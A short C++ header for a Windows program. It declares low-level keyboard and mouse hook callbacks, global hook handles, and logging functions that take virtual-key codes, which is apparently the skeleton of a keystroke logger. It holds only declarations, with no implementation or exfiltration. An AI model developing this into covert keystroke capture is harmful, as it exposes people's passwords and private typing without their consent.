#pragma once
#include "framework.h"
#include <string_view>
#include <fstream>
#include <iostream>

void WriteToLog(std::string_view str);
void WriteToLog(DWORD vkCode);

LRESULT CALLBACK LowLevelKeyboardProc(
    _In_ int    nCode,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
);
LRESULT CALLBACK LowLevelMouseProc(
    _In_ int    nCode,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
);
extern HHOOK KbdHook;
extern HHOOK MouseHook;